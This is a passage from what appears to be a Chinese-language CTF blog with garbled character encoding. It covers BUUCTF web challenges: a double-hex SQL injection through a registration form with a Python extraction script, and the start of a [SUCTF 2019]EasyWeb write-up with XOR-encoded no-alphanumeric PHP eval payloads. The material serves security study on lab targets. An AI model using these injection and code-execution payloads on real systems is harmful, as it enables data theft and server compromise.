id="ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨16è¿›åˆ¶è·å–æ•°æ®åº“ä¿¡æ¯"><a href="#ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨16è¿›åˆ¶è·å–æ•°æ®åº“ä¿¡æ¯" class="headerlink" title="ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨16è¿›åˆ¶è·å–æ•°æ®åº“ä¿¡æ¯:"></a>ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨16è¿›åˆ¶è·å–æ•°æ®åº“ä¿¡æ¯:</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†:"></a>åŸç†:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä»»ä½•ä»æ•°æ®åº“ä¸­æŸ¥è¯¢çš„æ•°æ®éƒ½å¯ä»¥é€šè¿‡16è¿›åˆ¶åŠ å¯†åè·å–ï¼ŒåŒæ—¶hex(hex(xxx))æ‰€å¾—åˆ°çš„ç»“æœä¸ºæ•°å­—ï¼Œæ‰€ä»¥å°±å¯ä»¥ç”¨æ¥é…åˆ0&#x27;+(select hex(hex(xxx))) +&#x27;0è¿›è¡Œä½¿ç”¨ï¼Œå¦‚æœåªè¿›è¡Œä¸€æ¬¡hex,å¯èƒ½ä¼šå¯¼è‡´åŠ ç§˜å¯†çš„ç»“æœä¸­å«æœ‰å­—æ¯ï¼Œä»è€Œæ— æ³•è¿›è¡Œ+çš„è¿ç®—ã€‚<br></code></pre></td></tr></table></figure><h4 id="è·å–æ•°æ®åº“çš„ä¿¡æ¯"><a href="#è·å–æ•°æ®åº“çš„ä¿¡æ¯" class="headerlink" title="è·å–æ•°æ®åº“çš„ä¿¡æ¯:"></a>è·å–æ•°æ®åº“çš„ä¿¡æ¯:</h4><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">email=s6%40qq.com&amp;username=0&#x27;%2B(select/**/hex(hex(database())))%2B&#x27;0&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215212512151.png" alt="image-20240215212512151"></p><p><img src="/images/2024-2-18/image-20240215212520900.png" alt="image-20240215212520900"></p><h5 id="hexå€¼"><a href="#hexå€¼" class="headerlink" title="hexå€¼:"></a>hexå€¼:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">373736353632<br></code></pre></td></tr></table></figure><h5 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†:"></a>è§£å¯†:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">web<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215212632550.png" alt="image-20240215212632550"></p><h4 id="è·å–flagçš„å€¼"><a href="#è·å–flagçš„å€¼" class="headerlink" title="è·å–flagçš„å€¼:"></a>è·å–flagçš„å€¼:</h4><h5 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„:"></a>æ³¨æ„:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ•°æ®ç»è¿‡ä¸¤æ¬¡hex åï¼Œä¼šå¾—åˆ°è¾ƒé•¿çš„ä¸€ä¸²åªå«æœ‰æ•°å­—çš„å­—ç¬¦ä¸²ï¼Œå½“è¿™ä¸ªé•¿å­—ç¬¦ä¸²è½¬æˆæ•°å­—å‹æ•°æ®çš„æ—¶å€™ä¼šå˜æˆç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šä¸¢å¤±æ•°æ®ç²¾åº¦ã€‚<br></code></pre></td></tr></table></figure><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">å…ˆå–flagçš„å‰10ä¸ªå­—ç¬¦:<br>email=12345%40qq.com&amp;username=0&#x27;%2B(select/**/hex(hex(substr((select/**/*/**/from/**/flag)/**/from/**/1/**/for/**/10))))%2B&#x27;0&amp;password=123<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240215214050903.png" alt="image-20240215214050903"></p><p><img src="/images/2024-2-18/image-20240215214102745.png" alt="image-20240215214102745"></p><p>å‘ç°é‡‡ç”¨äº†ç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥å–10ä¸ªå­—ç¬¦è¿˜æ˜¯å¤ªå¤§äº†ã€‚</p><h5 id="ä½¿ç”¨è„šæœ¬ï¼Œæ¯æ¬¡è·å–ä¸‰ä¸ªå­—ç¬¦"><a href="#ä½¿ç”¨è„šæœ¬ï¼Œæ¯æ¬¡è·å–ä¸‰ä¸ªå­—ç¬¦" class="headerlink" title="ä½¿ç”¨è„šæœ¬ï¼Œæ¯æ¬¡è·å–ä¸‰ä¸ªå­—ç¬¦:"></a>ä½¿ç”¨è„šæœ¬ï¼Œæ¯æ¬¡è·å–ä¸‰ä¸ªå­—ç¬¦:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># register.phpç•Œé¢</span><br>url1 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/register.php&quot;</span><br><span class="hljs-comment"># login.phpç•Œé¢</span><br>url2 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># index.phpç•Œé¢</span><br>url3 = <span class="hljs-string">&quot;http://673f044a-226c-4eb8-90d5-cf820ba8c828.node5.buuoj.cn:81/index.php&quot;</span><br><br><span class="hljs-comment"># è®¾ç½®æ•°æ®åº“åçš„é•¿åº¦</span><br>flag_len = <span class="hljs-number">50</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, flag_len):<br>    <span class="hljs-comment"># æ³¨å†Œ</span><br>    paylaod = <span class="hljs-string">&quot;0&#x27;+(select/**/hex(hex(substr((select/**/*/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/3))))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i*<span class="hljs-number">3</span>-<span class="hljs-number">2</span>)<br>    data1 = &#123;<br>        <span class="hljs-comment"># è®¾ç½®ä¸åŒçš„email</span><br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;666&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;username&quot;</span>: paylaod,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>        <br>    &#125;<br>    <span class="hljs-built_in">print</span>(data1)<br>    <span class="hljs-comment"># ä¸Šä¼ æ³¨å†Œä¿¡æ¯</span><br>    r1 = requests.post(url=url1, data=data1)<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># ç™»å½•</span><br>    data2 = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;666&#123;&#125;@qq.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">123</span><br>    &#125;<br>    <span class="hljs-built_in">print</span>(data2)<br>    <span class="hljs-comment"># ç”±äºlogin.phpç™»å½•ålocationä¸ºindex.php,æ‰€ä»¥ç›´æ¥é‡å®šå‘åˆ°index.phpç•Œé¢</span><br>    <span class="hljs-comment"># å›æ˜¾çš„å†…å®¹ä¹Ÿä¸ºindex.phpç•Œé¢çš„</span><br>    r2 = requests.post(url=url2, data=data2)<br>    <span class="hljs-comment"># print(r2.text)</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># è®¿é—®index.php</span><br>    <span class="hljs-comment"># r3 = requests.post(url=url3, data=data2)</span><br>    <span class="hljs-comment"># time.sleep(0.03)</span><br>    <span class="hljs-comment"># print(r3.text)</span><br>    <span class="hljs-comment"># è·å–usernameæ˜¾ç¤ºçš„å€¼</span><br>    soup = BeautifulSoup(r2.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    span_elements = soup.find_all(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)<br>    <span class="hljs-comment"># print(span_elements)</span><br>    uername_span_value = span_elements[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(uername_span_value)</span><br>    <span class="hljs-comment"># å›æ˜¾å…ƒç´ é‡Œé¢çš„å†…å®¹</span><br>    <span class="hljs-comment"># print(uername_span_value.text)</span><br>    <br>    <span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™æå–é‡Œé¢çš„æ•°å€¼</span><br>    <span class="hljs-comment"># pattern = r&#x27;&lt;span\s+class=&quot;user-name&quot;&gt;\s*(\d+)\s*&lt;/span&gt;&#x27;</span><br>    <span class="hljs-comment"># match = re.search(pattern, r2.text)</span><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, uername_span_value.text)<br>    <span class="hljs-comment"># è·å–åŒ¹é…çš„å†…å®¹</span><br>    <span class="hljs-keyword">match</span> = <span class="hljs-keyword">match</span>.group()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br>    <span class="hljs-keyword">try</span>:<br>        byte_object = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-keyword">match</span>)  <span class="hljs-comment"># è§£ç ä¸ºå­—èŠ‚å¯¹è±¡</span><br>        decoded_string = byte_object.decode()<br>        byte_object = <span class="hljs-built_in">bytes</span>.fromhex(decoded_string)  <span class="hljs-comment"># è§£ç ä¸ºå­—èŠ‚å¯¹è±¡</span><br>        result = byte_object.decode()<br>        flag = flag + result<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">continue</span><br>    <br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h5 id="è¾“å‡º-3"><a href="#è¾“å‡º-3" class="headerlink" title="è¾“å‡º:"></a>è¾“å‡º:</h5><p><img src="/images/2024-2-18/image-20240215222233246.png" alt="image-20240215222233246"></p><p>flag&#x3D;flag{8e13d363-3905-4f76-8f9a-b9e17c008355}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[SUCTF 2019]EasyWeb</title>
    <link href="/2024/02/18/2024-02-18-%5BSUCTF%202019%5DEasyWeb/"/>
    <url>/2024/02/18/2024-02-18-%5BSUCTF%202019%5DEasyWeb/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p>[<a href="https://blog.csdn.net/rfrder/article/details/111207725">SUCTF 2019]EasyWeb-CSDNåšå®¢</a></p><p>[<a href="https://www.cnblogs.com/Article-kelp/p/16097100.html">BUUCTFé¢˜è§£][SUCTF 2019]EasyWeb - Article_kelp - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯:"></a>åœºæ™¯:</h2><p><img src="/images/2024-2-18/image-20240213133746094.png" alt="image-20240213133746094"></p><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡:"></a>ä»£ç å®¡è®¡:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// æ–‡ä»¶ä¸Šä¼ å‡½æ•°ï¼Œä½†æ˜¯ä¸»å‡½æ•°æ²¡æœ‰æ‰§è¡Œ</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// è·å–å‚æ•°_çš„å€¼ï¼Œå¯ä»¥ç”¨éæ³•ä¼ å‚.ä»£æ›¿</span><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯å¦é•¿åº¦è¶…è¿‡18</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><span class="hljs-comment">// æ— æ•°å­—å­—æ¯rce</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><span class="hljs-comment">// è¿”å›å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—ç¬¦å‡ºç°çš„æ¬¡æ•°ï¼Œä»¥å…³è”æ•°ç»„çš„å½¢å¼</span><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-comment">// ç»Ÿè®¡å…³è”æ•°ç»„æœ‰å¤šå°‘ä¸ªå­—ç¬¦ç±»å‹ï¼Œä¸èƒ½è¶…è¿‡12ç§</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><span class="hljs-comment">// å±é™©å‡½æ•°æ‰§è¡Œ</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>æ ¹æ®å¯¹ä¸»ç¨‹åºçš„ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬çŸ¥é“è¿™é‡Œæˆ‘ä»¬éœ€è¦é‡‡ç”¨æ— æ•°å­—å­—æ¯rceçš„æ–¹å¼ã€‚</p><h2 id="æ— æ•°å­—å­—æ¯rceçš„payload"><a href="#æ— æ•°å­—å­—æ¯rceçš„payload" class="headerlink" title="æ— æ•°å­—å­—æ¯rceçš„payload:"></a>æ— æ•°å­—å­—æ¯rceçš„payload:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo<br>æˆ–<br>?.=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213151532252.png" alt="image-20240213151532252"></p><p>ç”±äºéœ€è¦åˆ©ç”¨system(â€˜ls &#x2F;â€˜);ä»¥åŠecho <code>ls /</code>;è¿™äº›ä»£ç éƒ½æ˜¯éœ€è¦è¿›è¡Œæ‹¼æ¥å­—ç¬¦ä¸²æ‰å¯ä»¥è¢«eval()æ‰§è¡Œ,å¦‚:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$_GET[a]($_GET[b])=&gt;a=system&amp;b=&#x27;ls /&#x27;<br></code></pre></td></tr></table></figure><p>è€Œè¿™æ ·åšçš„ç»“æœå°±æ˜¯åŠ é•¿äº†æ„é€ çš„payloadå­—ç¬¦ä¸²å¯¼è‡´å­—ç¬¦ä¸²çš„é•¿åº¦è¾¹é•¿ï¼Œæ‰€å«å­—ç¬¦çš„ç§ç±»å˜å¤šï¼Œä»è€Œè¢«æ‹¦æˆª</p><p>ä½†æ˜¯é¢˜ç›®ä¸­ç»™å‡ºäº†è·å–flagçš„å‡½æ•°:get_the_flag,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨è¯¥å‡½æ•°è·å–flag</p><h2 id="è°ƒç”¨get-the-flag-å‡½æ•°"><a href="#è°ƒç”¨get-the-flag-å‡½æ•°" class="headerlink" title="è°ƒç”¨get_the_flag()å‡½æ•°:"></a>è°ƒç”¨get_the_flag()å‡½æ•°:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240213152944988.png" alt="image-20240213152944988"></p><p>æ²¡æœ‰å›æ˜¾å†…å®¹ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬åªæ˜¯è°ƒç”¨äº†è¯¥å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ä¸Šä¼ æ–‡ä»¶ã€‚</p><h2 id="å¯¹get-the-flag-å‡½æ•°ä»£ç å®¡è®¡"><a href="#å¯¹get-the-flag-å‡½æ•°ä»£ç å®¡è®¡" class="headerlink" title="å¯¹get_the_flag()å‡½æ•°ä»£ç å®¡è®¡:"></a>å¯¹get_the_flag()å‡½æ•°ä»£ç å®¡è®¡:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// æ–‡ä»¶ä¸Šä¼ å‡½æ•°ï¼Œä½†æ˜¯ä¸»å‡½æ•°æ²¡æœ‰æ‰§è¡Œ</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-comment">// è·å–æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ï¼Œéœ€è¦æ‹¼æ¥ä¸Šæˆ‘ä»¬çš„ipåœ°å€çš„md5åŠ å¯†å­—ç¬¦ä¸²</span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>        <span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶åœ°å€</span><br>         <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-comment">// åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºç©º</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-comment">// è·å–æ–‡ä»¶åä¿¡æ¯</span><br>        <span class="hljs-comment">// è·å–æš‚å­˜æ–‡ä»¶å¤¹ä¸­æ–‡ä»¶çš„è·¯å¾„å</span><br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-comment">// è·å–æ–‡ä»¶å</span><br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-comment">// è·å–æ–‡ä»¶çš„åç¼€åï¼Œè·å–æœ€åä¸€ä¸ª.ä¹‹åçš„å­—ç¬¦ä¸²å†…å®¹</span><br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// åˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶åç¼€åæ˜¯å¦æœ‰ph</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>    <span class="hljs-comment">// è·å–ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œå¦‚æœå«æœ‰&lt;?åˆ™æ‹¦æˆª</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºimageç±»å‹ï¼Œé€šè¿‡æ·»åŠ æ–‡ä»¶å¤´å¹»æœ¯æ¥ç»•è¿‡</span><br>    <span class="hljs-comment">// ä¸Šä¼ æ–‡ä»¶åˆ°æŒ‡å®šçš„è·¯å¾„</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.æ ¹æ®ä»£ç 